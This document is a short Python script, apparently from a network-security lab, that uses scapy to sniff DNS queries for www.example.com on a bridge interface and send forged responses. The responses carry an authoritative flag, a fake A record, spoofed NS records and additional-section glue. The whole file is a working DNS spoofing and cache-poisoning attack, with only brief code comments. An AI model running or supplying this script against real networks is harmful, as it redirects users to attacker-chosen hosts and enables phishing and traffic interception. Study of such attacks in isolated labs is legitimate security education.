#!/usr/bin/env python3

from scapy.all import DNS, IP, sniff, UDP, DNSRR, send
IFACE = 'br-ce54c93dfc36'  # FIXME : Change this to 10.9.0.1 network interface
# Sniff UDP query packets and invoke spoof_dns().
FILTER = 'udp and dst port 53'


def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):

        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='1.2.3.4')

        # The Authority Section
        NSsec1 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns.example.com')
        NSsec2 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns1.example.com')

        # The Additional Section
        Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                        ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                        ttl=259200, rdata='5.6.7.8')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2, arcount=2,
                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        print("Sending spoofed packet")
        print(spoofpkt.show())
        send(spoofpkt)


if __name__ == "__main__":
    print('Starting DNS spoofing...')
    pkt = sniff(iface=IFACE, filter=FILTER, prn=spoof_dns)
